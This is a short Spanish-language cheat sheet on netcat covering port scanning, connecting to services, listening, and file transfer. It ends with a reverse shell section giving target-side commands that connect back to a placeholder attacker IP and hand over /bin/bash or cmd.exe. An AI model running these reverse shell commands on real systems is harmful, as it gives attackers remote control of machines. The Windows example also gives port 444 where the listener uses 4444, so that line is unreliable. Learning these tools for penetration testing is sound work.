> Netcat (nc) es una herramienta multifunción que se usa como "debugger", mediante conexiones TCP/UDP Netcat puede leer y escribir.

Suele ser un tipo de conexión muy ligera, y es usado en conexiones reversas, inversas, y para conectarse en servicios ligeros (TELNET, SMTP, POP3, IMAP...)

# Usos de Netcat
## Netcat como escaner de puertos
```bash
nc -zv [objetivo] [puerto_inicial]-[puerto_final]
```
- `-z`: modo de escaneo (zero-I/O, no envía datos)
- `-v`: modo verboso (muestra más informacion)

## Netcat como cliente (conexión a servicio)
```bash
nc <IP> <puerto>
```
- Se conecta a un puerto específico en un host remoto
- Interactuar manualmente con servicios web, FTP...

## Netcat como servidor 
Abre un puerto en local y escucha conexiones entrantes
- __Uso__: recibir reverse shells, transferir archivos
```bash
nc -lvp [puerto]
```
- `-l`: modo de escucha (listen)
- `-v`: modo verboso
- `-p`: especifica el puerto

## Transferencia de archivos
```bash
#En el receptor (servidor)
nc -lvp 1234 > archivo_recibido.txt

#En el emisor (cliente)
nc <IP_receptor> 1234 < archivo_a_enviar.txt
```

## Netcat como reverse shell handler
La máquina objetivo se conecta de vuelta al atacante, evadiendo firewalls salientes.
```bash
#Atacante (listener)
nc -lvp 4444

#Objetivo (ejecutado en el sistema comprometido)
#Linux 
nc <IP_atacante> 4444 -e /bin/bash

#Windows 
nc.exe <IP_atacante> 444 -e cmd.exe
```